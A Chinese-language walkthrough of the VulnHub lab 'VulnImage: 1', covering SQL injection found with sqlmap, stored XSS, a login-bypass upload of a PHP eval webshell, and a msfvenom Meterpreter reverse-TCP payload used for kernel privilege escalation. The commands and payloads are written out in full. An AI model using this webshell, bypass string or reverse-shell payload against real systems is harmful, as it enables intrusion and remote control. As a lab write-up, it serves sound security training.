# VulnImage: 1

项目地址：https://download.vulnhub.com/vulnimage/vulnimage.zip

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/69722e362d08d4bddaa6ffbb.png)

访问 80 端口先找到一个发送博客的功能点

![](https://pic1.imgdb.cn/item/69722ee12d08d4bddaa70181.png)

## SQL 注入

### Post（两个）

![](https://pic1.imgdb.cn/item/69722eac2d08d4bddaa700e3.png)

测试技巧

```bash
# -p 指定参数测试
sqlmap -u "http://192.168.202.150/admin/post.php" --data="month=January&date=22&year=2026&username=test1&password=123456&time=05%3A08&title=aaa&entry=bbb&submit=Submit" -p "username"
```

![](https://pic1.imgdb.cn/item/697231142d08d4bddaa709e9.png)

![](https://pic1.imgdb.cn/item/697231a32d08d4bddaa70c55.png)

### profile（两个）

同样也是账号密码

![](https://pic1.imgdb.cn/item/697233642d08d4bddaa71290.png)

### View

扫目录扫出这个页面，但是报错了，看样子是缺少 ID

![](https://pic1.imgdb.cn/item/6972410e2d08d4bddaa74803.png)

补充上去页面回显不一样，说明思路是对的

![](https://pic1.imgdb.cn/item/697241552d08d4bddaa74964.png)

## XSS

### Post（存储）

使用万能密码绕过后端校验就可能正常发送博客了

![](https://pic1.imgdb.cn/item/69723d4d2d08d4bddaa73cca.png)

![](https://pic1.imgdb.cn/item/69723d222d08d4bddaa73cc1.png)

## RCE

扫描目录发现有个 `/profiles`

![](https://pic1.imgdb.cn/item/697234fb2d08d4bddaa7191a.png)

类似于日志文件，都可以点进去访问

文件名命名规则是随机数 + 用户名 + `-- --sig.txt` 结尾

![](https://pic1.imgdb.cn/item/6972358d2d08d4bddaa71c4e.png)

使用插件在网页中发现一个隐藏元素

![](https://pic1.imgdb.cn/item/697238572d08d4bddaa72de8.png)

原来添加后缀是在前端做的，所以我们可以改掉

![](https://pic1.imgdb.cn/item/697238ba2d08d4bddaa730a8.png)

上传时使用万能密码绕过登录

```bash
username=admin&password=admin'%20or%20'a'='a&sig=%3C%3Fphp%20%40eval(%24_POST%5B%22code%22%5D)%3F%3E&fname=webshell.php&submit=Submit
```

![](https://pic1.imgdb.cn/item/69723c5f2d08d4bddaa73c98.png)

这个时候就有我们的木马了

![](https://pic1.imgdb.cn/item/69723cc62d08d4bddaa73cb9.png)

蚁剑连接成功

![](https://pic1.imgdb.cn/item/69723f422d08d4bddaa74010.png)

## 提权

### 内核 2009-2692

查看靶机内核版本，准备打内核漏洞（二进制的环境有问题）

![](https://pic1.imgdb.cn/item/697247c02d08d4bddaa75134.png)

通过 MSF 生成木马传到靶机上

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.202.128 LPORT=4444 -f elf -o exp.elf
```

![](https://pic1.imgdb.cn/item/69724a842d08d4bddaa75547.png)

控制台中监听

![](https://pic1.imgdb.cn/item/69724ab32d08d4bddaa75599.png)

靶机下载运行

![](https://pic1.imgdb.cn/item/69724ac92d08d4bddaa755ca.png)

按 Ctrl + Z 把当前会话放到后台

![](https://pic1.imgdb.cn/item/69724b6f2d08d4bddaa75705.png)

使用后渗透模块并设置参数

![](https://pic1.imgdb.cn/item/69724b9b2d08d4bddaa75727.png)

找这些能用的漏洞模块（绿色）

![](https://pic1.imgdb.cn/item/69724c142d08d4bddaa75770.png)

使用时要切换端口，避免占用

![](https://pic1.imgdb.cn/item/69724d2c2d08d4bddaa7584e.png)

![](https://pic1.imgdb.cn/item/69724d5c2d08d4bddaa75852.png)